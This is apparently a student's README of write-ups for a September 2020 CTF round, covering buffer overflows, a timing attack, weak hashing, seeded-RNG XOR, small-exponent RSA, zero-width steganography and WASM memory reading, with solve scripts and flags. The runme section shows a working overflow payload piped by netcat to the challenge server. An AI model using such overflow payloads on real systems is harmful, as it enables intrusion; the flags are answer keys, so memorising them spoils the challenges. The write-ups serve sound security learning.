# [√-1 + 1] CTF server problems 
September 2020 Round  

Ranking: 2/42 with 3065 points (33/33 challenges solved).




| Challenge               | Type | Points |
|-------------------------|------|--------|
| Sanity Check | Misc | 15 |
| Robots | Web | 50 |
| Linux Skillz | Misc | 50 |
| [bof](bof/) | Pwn | 50 |
| [LazyDB](#lazy-db) | Web | 200 |
| Hexcelent Moves | Crypto | 50 |
| MD5ed | Crypto | 75 |
| Biblio | OSINT | 75 |
| [Hashed Potatoes](#hashed-potatoes) | Crypto | 125 |
| [Quick Maths](quickmaths/) | Programming | 100 |
| zhiepx | Forensics | 75 |
| [Infinity Library](#infinity-library) | OSINT | 75 |
| Steg 1 | Forensics | 75 | 
| amy | OSINT/Math | 75
| SHA256ed | Crypto | 75 |
| Discord Flag | Misc | 50 |
| Keywords Ugh! (extra) | Crypto | 125 |
| [Random XOR](randomXOR/) | Crypto | 150 |
| [e](#e) | Crypto | 125 |
| My Website! | Web | 50 |
| [SUPER SECURE ENCRYPTER](supersecret/) | Crypto/RE | 200 |
| [Not So Easy Binary Decode](easybinarydecode/) | Crypto | 100 |
| Whitened | Misc | 50 |
| [Hello World!](helloworld/) | Forensics | 100 |
| [1337 secret challenge (extra)](helloworld/) | Forensics | 25 | 
| [WASM](wasm/) | Web | 200 |
| The online classroom. | OSINT | 100 |
| The Flag Is In The Past | OSINT | 100 |
| MD5² | Crypto | 75 |
| Braille | Crypto | 25 |
| Whirlpool | Crypto | 75 |
| Substitute Teacher | Crypto | 50 |
| [runme](runme/) | Pwn | 200 |



This README holds all of the writeups I completed. See individual folders for source and solve scripts.


## bof 
> What's a buffer? Hmmmmmm... Is my buffer too small?
```
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[64];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("\n\n\n\nMinecraftcito\nWhere you need to survive all day and all night\nCraft a diamond sword so you can fight\nPlace a torch in a cave to produce some light\nMinecraftcito\n");
  puts("What song do you want me to sing next?\n");
  
  gets(name);
  printf("Sorry, I don't know how to sing that...\n");
  if(code != 0) {
    system("cat flag.txt");
     printf("\n\n\n");
  }
}

```
This is a simple buffer overflow. name is stored as a char array with length 64. The gets() method assigns user input to name without sanitizing the input to check if it's valid. This means that if we type in something that's longer than the length of 64, it will start overwriting previous lines. In this case, since the program checks if the value of `code` is not equal to 0, we only need to rewrite code. Putting in 65 `a`'s should be sufficient. 

Flag: `flag{buff3r_0v3rfl0w_1s_d4ng3r0uS}`


## Lazy DB
> Timmy really hates hackers so he created a honeypot!Can you teach this kid a lesson?
> PS: He didn't even choose a good database provider so you will probably face some lag...

I bruteforced this by hand. I mean, it was only 18 characters...
This was a timing attack, meaning that the more correct the input is (checking from the front) the longer the server will take to respond. Since there's only ones and zeros and printable ASCII characters follow a similar 8 bit pattern, it wasn't too hard. I opened up the network panel in devtools to check for the first few, but eventually I just tested adding 1's and 0's.

Flag: `flag{c001_71m1ng5}`


## Hashed Potatoes
> I hashed my password with MD5 100 times! It's so secure, I only needed to make my password 1 character long. The flag is flag{<the password you get>}
> 10502fa81a010bfab50c6cad9745b7d8

Since it's only 1 character long, we can test each of the hashes for printable ASCII characters (range: [33, 127]).

```
from hashlib import md5

hashtext = "10502fa81a010bfab50c6cad9745b7d8"

for j in range(33, 127):
  test = str(chr(j))
  for i in range(100):
    test = md5(bytes(test, 'utf-8')).hexdigest()
  if (test == hashtext):
    print(chr(j))
    break
```
Flag: `flag{4}`


## Quick Maths
> My teacher sent me some massive homework!
Can you solve it for me?

When connecting, we're given a string that looks something like 
```
72857789302222-95357471421734
25254833624719+80134199293517
```

This goes on for 300 lines. To automate the netcat connection, we can use the pwntools python module. 

```
from pwn import *

stillInp = True
conn = remote('netcat.et3rnos.ga', 10000)

while stillInp:
	line = conn.readline()
	print(line)
	if (b'+' in line):
		a = int(line.split(b'+')[0]) + int(line.split(b'+')[1])
		print(a)
		conn.sendline(str(a))
	elif (b'-' in line):
		a = int(line.split(b'-')[0]) - int(line.split(b'-')[1])
		print(a)
		conn.sendline(str(a))
	else:
		stillInp = False
```

Flag: `flag{w0w_qu1ck_m4th5}`


## Infinity Library
> I lost my flag in an infinite library... Can you find it for me? I think I might have left it in wall 4, in shelf 5, in volume 11... 
> Hint: I think I left the flag on page 353...

Using the address given in babel.txt, we access wall 4, shelf 5, volume 11, page 353 on <https://libraryofbabel.info/>, which gives us this text

> the flag is flag.library,of,babel. replace the periods with curly brackets and r
eplace the commas with underscores.  

Flag: `flag{library_of_babel}`


## Random XOR
> My crypto can't be cracked. I used a RNG to generate the key.

> 91 79 52 35 45 95 39 95 102 0 83 123 98 72 55 57 65 59 50 54 37 97 10 77
```
import random

random.seed(12)

flag = "**REDACTED**"
ciphertext = ""

for n in flag:
    ciphertext += str(random.randint(1,100) ^ ord(n)) + " "

print(ciphertext)
```

Numbers generated with a specified random seed will always result in the same "random" numbers on multiple executions. We can use this to reverse the cipher text.

```
import random

cipherarr = [91, 79, 52, 35, 45, 95, 39, 95, 102, 0, 83, 123, 98, 72, 55, 57, 65, 59, 50, 54, 37, 97, 10, 77]

random.seed(12)
flag = ""

for n in cipherarr:
  ph = random.randint(1,100) ^ n
  flag += chr(ph)

print(flag)
```

Flag: `flag{r4nd0m_1snt_s3cur3}`


## e
> my almonds stopped raining :(
```
n = 5171500244749784337732001370840813567535978672198847710734293824916894058819438426874346854596575194681574556032488738156179043545483383532279185836509578876896977900209373001322643645013864307015839183171957952811351389535441340605132231378228775525290527087955956325880248332921167992489485784755379
e = 3
c = 1668144786171137605311207197306944260478050012349906224126603002897455362394099285517422760838331356624110177579827875805257224612660500133080543787474026595048166638720426396963970753973937038866496085024710487212750758818995532990329189
```
This is RSA! Credit to <https://blog.kuhi.to/picoctf_2019_crypto_writeup> for the process.

```
ciphertext = plaintext ^ e mod n = plaintext ^ e, if plaintext ^ e < n
```

In Python,
```
>>> import gmpy2
>>> from Crypto.Util.number import long_to_bytes
>>> gmpy2.get_context().precision=2048
>>> n = 5171500244749784337732001370840813567535978672198847710734293824916894058819438426874346854596575194681574556032488738156179043545483383532279185836509578876896977900209373001322643645013864307015839183171957952811351389535441340605132231378228775525290527087955956325880248332921167992489485784755379
>>> e = 3
>>> c = 1668144786171137605311207197306944260478050012349906224126603002897455362394099285517422760838331356624110177579827875805257224612660500133080543787474026595048166638720426396963970753973937038866496085024710487212750758818995532990329189
>>> pt = gmpy2.root(c, e)
>>> print(long_to_bytes(pt).decode())
```
Flag: `flag{e_sh0u1d_n3v3r_b3_th1s_sm0l}`


## SUPER SECURE ENCRYPTER
> I just made a SUPER SECURE ENCRYPTER. It takes your text and encrypts it BEYOND recovery. At least I think so...
> zCR\{fzR*RzkRf>RzkRkfzkRRkzkRk>zkzW*kfWCz}

The encryption algorithm is hard to decrypt because multiple plaintext letters can be mapped to one ciphertext letter. We use the encryption script to make a dictionary. We're given the hint that the flag is all uppercase, so our alphabet consists of the following characters
> {ABCDEFGHIJKLMNOPQRSTUVWXYZ}

Testing numbers gives us an out-of-bounds, so we know we're not looking at leet text. Here's the original dictionary
```
{:{
f:DISX
z:EJTY
R:CHRW
*:FU
k:AP
>:GV
W:O
C:N
}:}
```

After trying to come up with potential words, I realized that it might have some sort of delimiter to separate them. CTF flags usually use underscores, so we add that to our alphabet and run it through the encryption script. One mapping changes from 
`k:AP to k:AP_`

Looking at the flag to character mapping, we can guess that most of the `k`'s are going to map to underscores based on the spacing between subsequent `k`s. It's then a matter of looking for patterns and testing combinations (see supersecret_mapping.txt).

The first combinations I saw were `WAIT` `ARRAY` and `DONE`. This particular problem writer has done a flag with similar wording
> FLAG{THIS_IS_IMPOSSIBLE_RIGHT_WAIT_WHAT_ARE_YOU_DOING...}

Credit to Hoi, who had tipped me off that the first word was `SECURE`. Knowing that there was a delimiter was key, because without it, you could get something like `SECUREPRIV` and get stuck. Filling in the words `SECURE`, `WAIT`, and `DONE`, we can guess the rest to get our flag.

Flag: `flag{SECURE_RIGHT_WAIT_WHAT_HAVE_YOU_DONE}`


## Not So Easy Binary Decode
> Little Timmy always admired hackers so he made a program to encrypt his lucky NUMBER using binary.
> However, he forgot to make the decryption program and now he can't decode his lucky NUMBER.
> Maybe you can help him?
> You should submit flag{decrypted_string} as the flag

We're heavily hinted that the flag is a number. Numbers in binary are only 6 bits long, so we can either pad the front of each 6-bit group with two zeros and put it in a decoder or just take substrings in intervals of 6. 

Flag: `flag{293379041573118045942178062455891115683939605429063126250374632854}`  

## Hello World!
> I​​​​‏​‍​​​​‏‌‎​​​​‎‏‍​​​​‏​‎​​​​‏‏‎​​​​‏‎​​​​​‏‎‍​​​​‏‍‍​​​​‏​‌​​​​‏‍‏​​​​‎‏​​​​​‏‎​​​​​‍​‌​​​​‎‏‏​​​​‏‍‏​​​​‏​‌​​​​‏‎‌​​​​‎‏​​​​​‏​‍​​​​‏‌‎​​​​‍​‍​​​​‏​‎​​​​‎‏​​​​​‏‎​​​​​‏‎‍​​​​‎‏‎​​​​‏‌‏​​​​‌‏‏​​​​‏‎‌​​​​‎‏​​​​​‏‎‌​​​​‏​‏​​​​‌‏‏​​​​‏‎​​​​​‎‏​​​​​‏​‍​​​​‌‏‎​​​​‏‍‏​​​​‎‏​​​​​‎‏‍​​​​‎‏​​​​​‏‎​​​​​‍​‌​​​​‎‏‏​​​​‏‍‏​​​​‍​‌​​​​‏‎‌​​​​‎‏​​​​​‍​‌​​​​‏‏​​​​​‏‎‌​​​​‏‍‏​​​​‍​‍​​​​‎‏​​​​​‎‏‏​​​​‏​‏​​​​‍​‍​​​​‏‌‎​​​​‏‌‎​​​​‍​‌​​​​‏‍​​​​​‏​‎​​​​‍​‌​​​‌​​​ forgot how to program, so I'll just type "Hello World". Much easier than making a program type it for me.

If we take a look at the file in a hex editor, there's a ton of characters between "H" and "ello World". We can see a repeating pattern of E2 80 8x, x being BCDEF. In unicode, we can see that these actual map to spaces -- more specifically, [zero-width spaces](https://www.utf8-chartable.de/unicode-utf8-table.pl?start=8192&number=128). We can use an online decoder like [zwsp-steg](https://github.com/offdev/zwsp-steg-js) to get our flag.

Credit to MatthewN for the tip.

Flag: `flag{00pS_1_th0ught_th1s_w4s_4as1er}`

Taking the challenge text, we try that too for the 1337 secret challenge. 

Flag: `flag{super_s3cret_fl4g_subm1t_th1s_f0r_a_s3cr3t_3xtr4_ch4ll3ng3}`


## WASM
> Find my flag... It's hidden in memory!
https://digitalmortifiedactivecell.mendel3.repl.co/
Hints: https://stackoverflow.com/questions/51562325/webassembly-correct-way-to-get-a-string-from-a-parameter-with-memory-address
https://marcoselvatici.github.io/WASM_tutorial/

I don't think this was the intended way to solve, especially given the first hint, but it was easy to understand and execute. We're told to search through the memory, and the second hint references the `getValue` function, which can return values from memory.

Since we don't know the specific address, we just check all of them. The following code checks through all values in WASM memory, sees if they are not 0, checks if the decimal corresponds to a printable ASCII character, then prints it.  This is then printed to the Javacript console. The printable ASCII character part is technically not necessary to solve this problem, but it does remove a lot of the garbage.

```
var i;
for (i = 0; i < Module.HEAP8.byteLength; i++){
    var val = getValue(i, "i8");
    if ( val != 0 && val >= 33 && val <= 127) {
        console.log(getValue(i, "i8"));
    }
}
```

Converting that decimal output to ASCII using RapidTables we get
> msc'-&:6q/%r3.4tl6q3p%lq'l6t,<%sIlefÓheflagheresomewarebutIcan'trememberwhereIputit.Couldyousearchthroughmymemoryandfindit?-+0X0x(nuÒ)0123456789ABCDEF-0X+0X0X-0x+0x0xinfINFnanNAN.XgTsX!s!$!flag{w0nd3rou5-w0r1d-0f-wa5m}'-&:6q/%r3.4tl6q3p%lq'l6t,<./this.programP

Flag: `flag{w0nd3rou5-w0r1d-0f-wa5m}`


## runme
> Run my program! Connect with nc imaginary.ml 10006.

See the full and cleaner writeup in the [runme folder](runme/runme_writeup.pdf).


Unlike the previous binary exploitation challenge, we're only given the binary. Sad. Upon testing the program with a bunch of garbage, we find that this is another buffer overflow.

I spent a very long time trying to go through GDB `disassemble main` and trying to find the offset. I'll leave my work in here but I didn't get very far. 
```
55 = segfault at __libc_start_main
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e16c00 in __libc_start_main (main=0x7ffff7fb1680 <_IO_stdfile_0_lock>, 
    argc=1431672497, argv=0x0, init=0x7ffff7fae980 <_IO_2_1_stdin_>, 
    fini=0x7fffffffe050, rtld_fini=0x0, stack_end=0x7fffffffe168)
    at ../csu/libc-start.c:141
141     ../csu/libc-start.c: No such file or directory.
```

Here I was trying to figure out the offset was using a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and GDB, but alas.

```
62 will rewrite all

63 = segfault in main()
0x00005555555551e2 in main () -- return function

python -c "print('A'*58 + '\xcb\x51\x55\x55\x55\x55')"
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7AËQUUUU

+60 and +64 (cmp and jne) check if %rax is not equal to %rbp. If it's not, then make the jump (an if statement).
```

After this part, I knew that there was an if-statement at the end that checked if two values were equal to one another. If false, then it would skip the execution, which was the `<system@plt>`. However, I wasn't sure how this would evaluate in C. I tried to compare the binary to previous challenges, but no luck. I went to sleep.

After a night, ainz gave me a hint to look into Ghidra. Woo! Alright, 30 minutes left. loading it up, I realize that Ghidra had the decompiler I was trying to find online. Here's the binary decompiled:
```
undefined8 main(void)

{
  char local_38 [40];
  long local_10;
  
  local_10 = 0xba5eba11;
  printf("What would you like to put in my variable? ");
  gets(local_38);
  if (local_10 == 0xacce55e5) {
    system("cat flag.txt");
  }
  return 0;
}

```

It's very clear now that we just need to overflow the buffer of local_38 in order to change the initialization of local_10. To do this, the offset was `40` and we add the hex value that `local_10` is being checked for. Anyway.

testing:  
I had set up a flag.txt file that just read "opened flag.txt", which was used to confirm that the exploit worked. 
```
$ chmod +x runme
$ python -c "print 'A'*40+'\xe5\x55\xce\xac'" > temp
$ ./runme < temp
opened flag.txt
```


exploit:
```
python -c "print 'A'*40+'\xe5\x55\xce\xac'" | nc imaginary.ml 10006
```

Flag: `flag{0v3rwr1t1ng_4_v4r1abl3?_c00l!}`

Resources used for runme:
- [0xRICK's intro to buffer overflows](https://0xrick.github.io/binary-exploitation/bof1/)
- [Hacktober CTF Writeup](https://veteransec.com/2018/10/19/hacktober-ctf-2018-binary-analysis-larry/)
- [StackOverflow on reading input](https://stackoverflow.com/questions/16508817/how-do-i-provide-input-to-a-c-program-from-bash)
- [Online Disassembler](https://onlinedisassembler.com/odaweb/)
- [Install Ghidra on Kali Linux](https://executeatwill.com/2019/04/04/Install-Ghidra-on-Kali-Linux/) ([+tutorial](https://www.youtube.com/watch?v=fTGTnrgjuGA))
- [kgbuquerin's video on a similar exploit](https://www.youtube.com/watch?v=C-k516BHPl8)

